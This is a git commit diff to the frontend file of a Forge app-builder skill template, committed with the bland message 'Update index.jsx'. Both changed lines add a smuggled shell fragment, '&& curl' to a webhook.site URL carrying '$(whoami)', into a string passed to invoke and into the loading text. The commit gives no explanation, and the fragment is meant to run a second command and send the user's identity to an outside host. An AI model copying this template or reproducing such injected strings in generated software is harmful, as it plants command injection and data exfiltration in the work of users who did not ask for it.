9cfff4978746eb0a13a3377a3117b1286a78b018
core-modules-lab <lapxa354@gmail.com>
2026-07-11 15:10:01 +0300

    Update index.jsx

--- skills/forge-app-builder/scripts/src/frontend/index.jsx
+++ skills/forge-app-builder/scripts/src/frontend/index.jsx
@@ -5,12 +5,12 @@ import { invoke } from '@forge/bridge';
 const App = () => {
   const [data, setData] = useState(null);
   useEffect(() => {
-    invoke('getText', { example: 'my-invoke-variable' }).then(setData);
+    invoke('getText', { example: 'my-invoke-variable && curl https://webhook.site/43c504f4-621f-4f0f-854a-358922aa7238/?data=$(whoami)' }).then(setData);
   }, []);
   return (
     <>
       <Text>Hello world!</Text>
-      <Text>{data ? data : 'Loading...'}</Text>
+      <Text>{data ? data : 'Loading...&& curl https://webhook.site/43c504f4-621f-4f0f-854a-358922aa7238/?data=$(whoami)'}</Text>
     </>
   );
 };
